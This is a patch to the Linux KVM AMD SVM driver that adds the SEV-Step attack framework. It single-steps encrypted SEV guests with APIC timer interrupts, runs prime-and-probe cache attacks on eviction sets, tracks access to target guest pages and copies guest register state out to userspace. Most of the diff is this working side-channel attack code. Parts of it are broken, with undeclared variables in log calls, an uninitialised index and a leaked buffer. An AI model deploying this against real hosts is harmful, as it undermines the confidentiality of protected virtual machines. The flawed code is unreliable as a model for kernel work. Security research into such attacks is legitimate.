@@ -42,11 +42,20 @@
 #include <asm/virtext.h>
 #include "trace.h"
 
+#define __ex(x) __kvm_handle_fault_on_reboot(x)
+
+//SEV STEP
+#include <linux/sev-step/my_idt.h>
+#include <linux/sev-step/userspace_page_track_api.h>
+#include <linux/sev-step/sev-step.h>
+
 #include "svm.h"
 #include "svm_ops.h"
 
 #include "kvm_onhyperv.h"
 #include "svm_onhyperv.h"
+
+#define svm_ssdbg_log(fmt, ...) ;//printk(fmt, ##__VA_ARGS__);
 
 MODULE_AUTHOR("Qumranet");
 MODULE_LICENSE("GPL");
@@ -2076,8 +2085,13 @@ static int nmi_interception(struct kvm_vcpu *vcpu)
 	return 1;
 }
 
+uint64_t sev_step_get_rip(struct vcpu_svm* svm); //defined in sev-step.c
+
 static int smi_interception(struct kvm_vcpu *vcpu)
 {
+	//TODO: Introduced in cherry pick. Not sure if correct
+	struct vcpu_svm *svm = to_svm(vcpu);
+	++svm->vcpu.stat.irq_exits;
 	return 1;
 }
 
@@ -3786,13 +3800,154 @@ static fastpath_t svm_exit_handlers_fastpath(struct kvm_vcpu *vcpu)
 
 static noinstr void svm_vcpu_enter_exit(struct kvm_vcpu *vcpu)
 {
+	void* chase = NULL;
+	void* chase_rev = NULL;
 	struct vcpu_svm *svm = to_svm(vcpu);
 	unsigned long vmcb_pa = svm->current_vmcb->pa;
+	unsigned apic_timer_value =0;
 
-	guest_state_enter_irqoff();
+	kvm_guest_enter_irqoff();
 
+
+	
+
+	//luca: also includes sev-snp, i.e. is inclusive hierachy
 	if (sev_es_guest(vcpu->kvm)) {
-		__svm_sev_es_vcpu_run(vmcb_pa);
+		mutex_lock(&sev_step_config_mutex);
+		if(sev_step_is_single_stepping_active(&global_sev_step_config)) {
+			//sanity checks for nemesis: check vmcb stays the same
+			if(vmcb_is_dirty(svm->vmcb, VMCB_ASID)){
+			    printk("vmcb ASID marked as dirty");
+			}
+            if(vmcb_is_dirty(svm->vmcb, VMCB_CR)){
+			    printk("vmcb CR0,3,4 and EFER marked as dirty");
+			}
+            if(vmcb_is_dirty(svm->vmcb, VMCB_DT)){
+			    printk("vmcb GDT and IDT marked as dirty");
+			}
+            if(vmcb_is_dirty(svm->vmcb, VMCB_LBR)){
+			    printk("vmcb lbr marked as dirty");
+			}
+			if(vmcb_is_dirty(svm->vmcb, VMCB_AVIC)){
+			    printk("vmcb AVIC marked as dirty");
+			}
+			if( !global_sev_step_config.waitingForTimer ) {
+				apic_timer_value = global_sev_step_config.tmict_value;
+			}
+
+			svm_ssdbg_log("calculate_steps before: irqs_disabled?: 0x%x",irqs_disabled());
+			calculate_steps(&global_sev_step_config);
+			//always prepare and do chase, otherwise we would need to adjust single stepping timer for cache attack case
+			if( global_sev_step_config.cache_attack_config != NULL) {
+				global_sev_step_config.cache_attack_config->inplace_data_offset = 1;
+				cpu_fillEvSet(&chase, &chase_rev,
+					&global_sev_step_config.cache_attack_config->eviction_sets[global_sev_step_config.cache_attack_config->victim_lookup_table_idx]
+				);
+				cpu_prime_pointer_chasing(chase);
+				if( global_sev_step_config.cache_attack_config != NULL &&
+					global_sev_step_config.cache_attack_config->status == SEV_STEP_CACHE_ATTACK_WANT_PRIME &&
+					global_sev_step_config.cache_attack_config->type != SEV_STEP_EV_TYPE_L1D_KERN_ONLY_ALIASING) {
+
+						global_sev_step_config.cache_attack_config->status = SEV_STEP_CACHE_ATTACK_WANT_PROBE;
+
+						if( global_sev_step_config.cache_attack_config->use_custom_apic_timer_value ) {
+							apic_timer_value = global_sev_step_config.cache_attack_config->custom_apic_timer_value;
+							svm_ssdbg_log("Using custom apic timer value 0x%u for pending cache attack\n", apic_timer_value);
+
+						}
+				}
+			}
+
+			
+		}
+		mutex_unlock(&sev_step_config_mutex);
+
+		//function checks if single stepping is enabled
+		kvm_guest_enter_irqoff();
+
+		my_idt_prepare_apic_timer(&global_sev_step_config, svm);
+
+		//luca: assembly code in svm/vmenter.S
+		__svm_sev_es_vcpu_run(vmcb_pa,chase,apic_timer_value,chase_rev, APIC_BASE + APIC_TMICT, &vm_enter_exit_latency);
+		kvm_guest_exit_irqoff();
+
+		mutex_lock(&sev_step_config_mutex);
+		if(sev_step_is_single_stepping_active(&global_sev_step_config)) {
+			
+			global_sev_step_config.tsc_latency = vm_enter_exit_latency;
+		
+			if( global_sev_step_config.cache_attack_config != NULL &&
+					global_sev_step_config.cache_attack_config->status == SEV_STEP_CACHE_ATTACK_WANT_PROBE &&
+					global_sev_step_config.cache_attack_config->type != SEV_STEP_EV_TYPE_L1D_KERN_ONLY_ALIASING) {
+
+				svm_ssdbg_log("%s:%d : setting cache attack status to SEV_STEP_CACHE_ATTACK_HAVE_RESULT",__FILE__,__LINE__);
+				global_sev_step_config.cache_attack_config->status = SEV_STEP_CACHE_ATTACK_HAVE_RESULT;
+			}
+			svm_ssdbg_log("calculate_steps after: irqs_disabled?: 0x%x",irqs_disabled());
+			calculate_steps(&global_sev_step_config);
+			if( ( (svm->vmcb->control.event_inj & 0xff)== 0xec) && (svm->vcpu.arch.interrupt.injected ) ) {
+				svm_ssdbg_log("new exeception ignore triggered\n");
+				svm->vcpu.arch.interrupt.injected = false;
+		}
+		}
+		mutex_unlock(&sev_step_config_mutex);
+
+
+	mutex_lock(&sev_step_config_mutex);
+	if(global_sev_step_config.decrypt_vmsa) {
+		struct vmcb_save_area vmcb_sa;
+		struct sev_es_save_area* vmsa;
+		//shorthand
+		uint64_t* reg_val = global_sev_step_config.decrypted_vmsa_data.register_values;
+		vmsa = kmalloc(sizeof(struct sev_es_save_area), GFP_KERNEL);
+		if( sev_step_get_vmcb_save_area(&svm->vcpu,&vmcb_sa,vmsa) ) {
+			printk("sev_step_get_vmcb_save_area failed\n");
+		} 
+		
+		
+		reg_val[VRN_RIP] = vmcb_sa.rip;
+		if( sev_es_guest(vcpu->kvm) || sev_snp_guest(vcpu->kvm) ) {
+			if( vmsa != NULL ) {
+				reg_val[VRN_RFLAGS] = vmsa->rflags;
+				reg_val[VRN_RIP] = vmsa->rip;
+				reg_val[VRN_RSP] = vmsa->rsp;
+				reg_val[VRN_R10] = vmsa->r10;
+				reg_val[VRN_R11] = vmsa->r11;
+				reg_val[VRN_R12] = vmsa->r12;
+				reg_val[VRN_R13] = vmsa->r13;
+				reg_val[VRN_R8]  = vmsa->r8;
+				reg_val[VRN_R9]  = vmsa->r9;
+				reg_val[VRN_RBX] = vmsa->rbx;
+				reg_val[VRN_RCX] = vmsa->rcx;
+				reg_val[VRN_RDX] = vmsa->rdx;
+				reg_val[VRN_RSI] = vmsa->rsi;
+				reg_val[VRN_CR3] = vmsa->cr3;
+				global_sev_step_config.decrypted_vmsa_data.failed_to_get_data = false;
+				kfree(vmsa);
+			} else {
+				printk("sev_step_get_vmcb_save_area returned null for vmsa!");
+				global_sev_step_config.decrypted_vmsa_data.failed_to_get_data = true;
+			}
+		} else {
+			reg_val[VRN_RFLAGS] = vmcb_sa.rflags;
+			reg_val[VRN_RIP] = vmcb_sa.rip;
+			reg_val[VRN_RSP] =  vcpu->arch.regs[VCPU_REGS_RSP];
+			reg_val[VRN_R10] =  vcpu->arch.regs[VCPU_REGS_R10];
+			reg_val[VRN_R11] = vcpu->arch.regs[VCPU_REGS_R11];
+			reg_val[VRN_R12] = vcpu->arch.regs[VCPU_REGS_R12];
+			reg_val[VRN_R13] = vcpu->arch.regs[VCPU_REGS_R13];
+			reg_val[VRN_R8]  = vcpu->arch.regs[VCPU_REGS_R8];
+			reg_val[VRN_R9]  = vcpu->arch.regs[VCPU_REGS_R9];
+			reg_val[VRN_RBX] = vcpu->arch.regs[VCPU_REGS_RBX];
+			reg_val[VRN_RCX] = vcpu->arch.regs[VCPU_REGS_RCX];
+			reg_val[VRN_RDX] = vcpu->arch.regs[VCPU_REGS_RDX];
+			reg_val[VRN_RSI] = vcpu->arch.regs[VCPU_REGS_RSI];
+			reg_val[VRN_CR3] = vmcb_sa.cr3;
+			global_sev_step_config.decrypted_vmsa_data.failed_to_get_data = false;
+		}
+	}
+	mutex_unlock(&sev_step_config_mutex);
+
 	} else {
 		struct svm_cpu_data *sd = per_cpu(svm_data, vcpu->cpu);
 
@@ -3807,15 +3962,19 @@ static noinstr void svm_vcpu_enter_exit(struct kvm_vcpu *vcpu)
 		vmsave(svm->vmcb01.pa);
 
 		vmload(__sme_page_pa(sd->save_area));
+		kvm_guest_exit_irqoff();
 	}
 
-	guest_state_exit_irqoff();
+	kvm_guest_exit_irqoff(); //TODO: merge :was 	guest_state_exit_irqoff(); 
 }
 
 static __no_kcsan fastpath_t svm_vcpu_run(struct kvm_vcpu *vcpu)
 {
+	bool just_disblabled_stepping = false;
 	struct vcpu_svm *svm = to_svm(vcpu);
 
+
+	//printk("svm_vcpu_run: irqs_disabled?: 0x%x",irqs_disabled());
 	trace_kvm_entry(vcpu);
 
 	svm->vmcb->save.rax = vcpu->arch.regs[VCPU_REGS_RAX];
@@ -3859,6 +4018,111 @@ static __no_kcsan fastpath_t svm_vcpu_run(struct kvm_vcpu *vcpu)
 	else
 		svm_set_dr6(svm, DR6_ACTIVE_LOW);
 
+
+	//
+	// Sev step, "before" block
+	//
+
+
+	mutex_lock(&sev_step_config_mutex);
+	if( !global_sev_step_config.state_save_values_valid ) {
+		global_sev_step_config.vmsa_hpa = svm->vmcb->control.vmsa_pa;
+		global_sev_step_config.vmcb_hpa = svm->current_vmcb->pa;
+		global_sev_step_config.vmcb_control_kern_vaddr = (uint64_t)(&svm->vmcb->control);
+		global_sev_step_config.state_save_values_valid = true;
+	}
+
+
+	if(global_sev_step_config.single_stepping_status == SEV_STEP_STEPPING_STATUS_DISABLED_WANT_INIT ) {
+		setup_perfs(&global_sev_step_config);
+		svm_ssdbg_log("svm_vcpu_run: prepared PERF");
+		my_idt_install_handler(&global_sev_step_config);
+		svm_ssdbg_log("svm_vcpu_run: installed my_idt handler\n");
+		svm_ssdbg_log("svm_vcpu_run: Backup apic timer\n");
+		apic_backup(&global_sev_step_config);
+
+		global_sev_step_config.single_stepping_status = SEV_STEP_STEPPING_STATUS_ENABLED;
+		
+	} else if (global_sev_step_config.single_stepping_status == SEV_STEP_STEPPING_STATUS_ENABLED_WANT_DISABLE) {
+		svm_ssdbg_log("svm_vcpu_run: Restoring old apic timer values\n");
+		apic_restore(&global_sev_step_config);
+
+		svm_ssdbg_log("svm_vcpu_run: sending fake intr to vm to kick apic timer again\n");
+		svm->vcpu.arch.interrupt.injected = true;
+		svm->vcpu.arch.interrupt.soft = false;
+		svm->vcpu.arch.interrupt.nr = 0xec;
+		svm_set_irq(&(svm->vcpu));
+
+		global_sev_step_config.single_stepping_status = SEV_STEP_STEPPING_STATUS_DISABLED;
+		global_sev_step_config.entry_counter = 0;
+		just_disblabled_stepping = true;
+
+
+	}
+	mutex_unlock(&sev_step_config_mutex);
+
+
+	mutex_lock(&sev_step_config_mutex);
+	if(sev_step_is_single_stepping_active(&global_sev_step_config)) {
+		global_sev_step_config.entry_counter += 1;
+		//suppress injection of virtual apic interrupt to prevent jumping to intr handler in vm
+		if( ( (svm->vmcb->control.event_inj & 0xff)== 0xec) && (svm->vcpu.arch.interrupt.injected ) ) {
+			//printk("DEBUG: allowing event injection\n");
+			svm_ssdbg_log("ignoring exception injection due to active trace\n");
+			svm_cancel_injection(&(svm->vcpu));
+		}
+
+		if (global_sev_step_config.do_tlb_flush_before_each_step ) {
+			svm_ssdbg_log("Flushing guest tlb\n");
+			svm_flush_tlb(&(svm->vcpu)); //flushes whole tlb of guest //HUGE IMPROVEMENT!!!
+		} else {
+			svm_ssdbg_log("NOT flushing guest tlb\n");
+		}
+		
+		if( global_sev_step_config.gpas_target_pages != NULL ) {
+			int target_gpa_idx;
+
+			svm_ssdbg_log("Resetting access bits for %llu target pages\n",global_sev_step_config.gpas_target_pages_len);
+			for( target_gpa_idx = 0; target_gpa_idx < global_sev_step_config.gpas_target_pages_len; target_gpa_idx++) {
+				uint64_t gpa = global_sev_step_config.gpas_target_pages[target_gpa_idx];
+				if(!sev_step_reset_access_bit(&svm->vcpu, gpa >> 12)) {
+					printk("failed to reset access bit for gpa: 0x%llx\n",gpa);
+				}
+			}
+		}
+		svm_ssdbg_log("setting timer then vmenter\n");
+
+		svm_ssdbg_log("Dumping some vmcb data before entry\n");
+		svm_ssdbg_log("svm->vmcb->control.event_inj: 0x%x\n",svm->vmcb->control.event_inj);
+		svm_ssdbg_log("svm->vmcb->control.event_inj_err: 0x%x\n",svm->vmcb->control.event_inj_err);
+
+		svm_ssdbg_log("Dumping vcpu.arch.interrupt data before entry\n");
+		svm_ssdbg_log("svm->vcpu.arch.interrupt.injected: 0x%x\n",svm->vcpu.arch.interrupt.injected);
+		svm_ssdbg_log("svm->vcpu.arch.interrupt.soft: 0x%x\n",svm->vcpu.arch.interrupt.soft);
+		svm_ssdbg_log("svm->vcpu.arch.interrupt.nr: 0x%x\n",svm->vcpu.arch.interrupt.nr);
+	} else if (just_disblabled_stepping) {
+		svm_ssdbg_log("just_disblabled_stepping = true, about to vmenter\n");
+
+		svm_ssdbg_log("Dumping some vmcb data before entry\n");
+		svm_ssdbg_log("svm->vmcb->control.event_inj: 0x%x\n",svm->vmcb->control.event_inj);
+		svm_ssdbg_log("svm->vmcb->control.event_inj_err: 0x%x\n",svm->vmcb->control.event_inj_err);
+
+		svm_ssdbg_log("Dumping vcpu.arch.interrupt data before entry\n");
+		svm_ssdbg_log("svm->vcpu.arch.interrupt.injected: 0x%x\n",svm->vcpu.arch.interrupt.injected);
+		svm_ssdbg_log("svm->vcpu.arch.interrupt.soft: 0x%x\n",svm->vcpu.arch.interrupt.soft);
+		svm_ssdbg_log("svm->vcpu.arch.interrupt.nr: 0x%x\n",svm->vcpu.arch.interrupt.nr);
+	}
+	mutex_unlock(&sev_step_config_mutex);
+
+	
+	
+
+	//
+	// End of sev step "before" block
+	//
+
+
+
 	clgi();
 	kvm_load_guest_xsave_state(vcpu);
 
@@ -3872,6 +4136,7 @@ static __no_kcsan fastpath_t svm_vcpu_run(struct kvm_vcpu *vcpu)
 	 */
 	if (!static_cpu_has(X86_FEATURE_V_SPEC_CTRL))
 		x86_spec_ctrl_set_guest(svm->spec_ctrl, svm->virt_spec_ctrl);
+
 
 	svm_vcpu_enter_exit(vcpu);
 
@@ -3920,6 +4185,158 @@ static __no_kcsan fastpath_t svm_vcpu_run(struct kvm_vcpu *vcpu)
 		kvm_after_interrupt(vcpu);
 
 	sync_cr8_to_lapic(vcpu);
+
+	//
+	// Sev step "after" block
+	//
+
+	
+	mutex_lock(&sev_step_config_mutex);
+	if(sev_step_is_single_stepping_active(&global_sev_step_config)) {
+		svm_ssdbg_log("global_sev_step_config.active = true vmexit\n");
+		svm_ssdbg_log("exit reasons: 0x%x",svm->vmcb->control.exit_code);
+	}  else if (just_disblabled_stepping){
+		svm_ssdbg_log("just_disblabled_stepping = true, vmexit\n");
+		svm_ssdbg_log("exit reasons: 0x%x",svm->vmcb->control.exit_code);
+
+	}
+	mutex_unlock(&sev_step_config_mutex);
+
+
+	
+
+	mutex_lock(&sev_step_config_mutex);
+	if(sev_step_is_single_stepping_active(&global_sev_step_config)) {
+		int send_ret = 0;
+		sev_step_event_t ss_event = {
+			.counted_instructions = global_sev_step_config.counted_instructions,
+
+			/***************** NEMESIS ******************/
+			.tsc_latency = global_sev_step_config.tsc_latency,
+			/*******************************************/
+
+			.cache_attack_timings = NULL,
+			.cache_attack_perf_values = NULL,
+			.cache_attack_data_len = 0,
+			.is_decrypted_vmsa_data_valid = false,
+		};
+		if( global_sev_step_config.decrypt_vmsa ) {
+			ss_event.decrypted_vmsa_data = global_sev_step_config.decrypted_vmsa_data;
+			ss_event.is_decrypted_vmsa_data_valid = true;
+		}
+		if( global_sev_step_config.cache_attack_config != NULL && 
+			global_sev_step_config.cache_attack_config->status ==  SEV_STEP_CACHE_ATTACK_HAVE_RESULT &&
+			global_sev_step_config.cache_attack_config->type != SEV_STEP_EV_TYPE_L1D_KERN_ONLY_ALIASING ) {
+			addr_list_entry_t *e;
+			unsigned i = 0;
+			uint64_t eviction_set_idx = global_sev_step_config.cache_attack_config->victim_lookup_table_idx;
+			uint64_t data_offset = global_sev_step_config.cache_attack_config->inplace_data_offset;
+			addr_list_t* eviction_set = &global_sev_step_config.cache_attack_config->eviction_sets[eviction_set_idx];
+			for (e = eviction_set->first; e != NULL; e = e->next) {
+					/*uint64_t offset = ((uint64_t)(e->addr))&0xfffULL;
+					uint64_t timing = ((uint64_t*)(e->addr))[data_offset+0];
+					uint64_t perf_diff = ((uint64_t*)(e->addr))[data_offset+1];*/
+				//cpu_probe_pointer_chasing_inplace writes measurment data to the addr stored in e->addr
+				svm_ssdbg_log("%s:%d : elem %u\t, offset 0x%03llx, time %llu, perf diff %llu\n",__FILE__,__LINE__,
+					i/64, offset, timing, perf_diff);
+				i += 64;
+				ss_event.cache_attack_data_len += 1;
+			}
+			svm_ssdbg_log("\n\n\n");
+
+			//allocate dynamic timing array in event and copy timing values
+			ss_event.cache_attack_timings = kmalloc(sizeof(uint64_t) * ss_event.cache_attack_data_len, GFP_KERNEL);
+			ss_event.cache_attack_perf_values = kmalloc(sizeof(uint64_t) * ss_event.cache_attack_data_len, GFP_KERNEL);
+
+			i = 0;
+			for (e = eviction_set->first; e != NULL; e = e->next) {
+				uint64_t timing = ((uint64_t*)(e->addr))[data_offset+0];
+				uint64_t perf_diff = ((uint64_t*)(e->addr))[data_offset+1];
+				ss_event.cache_attack_timings[i] = timing;
+				ss_event.cache_attack_perf_values[i] = perf_diff;
+				i += 1;
+			}
+
+			global_sev_step_config.cache_attack_config->status =  SEV_STEP_CACHE_ATTACK_IDLE;
+		}
+		if( global_sev_step_config.cache_attack_config != NULL && 
+			global_sev_step_config.cache_attack_config->status ==  SEV_STEP_CACHE_ATTACK_HAVE_RESULT &&
+			global_sev_step_config.cache_attack_config->type == SEV_STEP_EV_TYPE_L1D_KERN_ONLY_ALIASING ) {
+
+			addr_list_entry_t *e;
+			unsigned i = 0;
+			int readings_idx;
+			uint64_t eviction_set_idx = global_sev_step_config.cache_attack_config->victim_lookup_table_idx;
+			uint64_t* readings = global_sev_step_config.cache_attack_config->chase_result_for_aliasing_attack;
+			addr_list_t* eviction_set = &global_sev_step_config.cache_attack_config->eviction_sets[eviction_set_idx];
+			for (e = eviction_set->first; e != NULL; e = e->next) {
+					/*uint64_t offset = ((uint64_t)(e->addr))&0xfffULL;
+					uint64_t timing = readings[2*readings_idx];
+					uint64_t perf_diff = readings[(2*readings_idx)+1];*/
+				//cpu_probe_pointer_chasing_inplace writes measurment data to the addr stored in e->addr
+				svm_ssdbg_log("%s:%d : elem %u\t, offset 0x%03llx, time %llu, perf diff %llu\n",__FILE__,__LINE__,
+					i/64, offset, timing, perf_diff);
+				i += 64;
+				readings_idx += 1;
+				ss_event.cache_attack_data_len += 1;
+			}
+			svm_ssdbg_log("\n\n\n");
+			
+			//allocate dynamic timing array in event and copy timing values
+			ss_event.cache_attack_timings = kmalloc(sizeof(uint64_t) * ss_event.cache_attack_data_len, GFP_KERNEL);
+			ss_event.cache_attack_perf_values = kmalloc(sizeof(uint64_t) * ss_event.cache_attack_data_len, GFP_KERNEL);
+
+			i = 0;
+			readings_idx = 0;
+			for (e = eviction_set->first; e != NULL; e = e->next) {
+				uint64_t timing = readings[readings_idx];
+				uint64_t perf_diff = readings[readings_idx+1];
+				ss_event.cache_attack_timings[i] = timing;
+				ss_event.cache_attack_perf_values[i] = perf_diff;
+				i += 1;
+				readings_idx += 2;
+			}
+
+			global_sev_step_config.cache_attack_config->status =  SEV_STEP_CACHE_ATTACK_IDLE;
+		}
+		
+
+		if( global_sev_step_config.single_stepping_status == SEV_STEP_STEPPING_STATUS_ENABLED_WANT_DISABLE ) {
+			svm_ssdbg_log("ignoring single step event, as user already requestd signle step disable\n");
+			mutex_unlock(&sev_step_config_mutex);
+		} else {
+			/*if we would call usp_send_and_block while holding the lock, we could not terminate/abort until sent is done
+			as the ioctl api also uses this lock
+			*/
+			mutex_unlock(&sev_step_config_mutex); 
+			send_ret = usp_send_and_block(uspt_ctx, SEV_STEP_EVENT, (void *)&ss_event);
+			//sent sev step event
+			switch (send_ret)
+			{
+			case 2:
+				printk("usp_send_and_block aborted due to force_reset\n");
+				break;
+			case 0:
+				//no error
+				break;
+			default:
+				printk("usp_send_and_block: Failed in svm_vcpu_run with %d",send_ret);
+				break;
+			}
+			if( ss_event.cache_attack_timings != NULL ) {
+				kfree(ss_event.cache_attack_timings);
+			}
+		}
+	} else {
+		mutex_unlock(&sev_step_config_mutex);
+	}
+
+
+	//
+	// End of sev step after block
+	//
+
+	
 
 	svm->next_rip = 0;
 	if (is_guest_mode(vcpu)) {
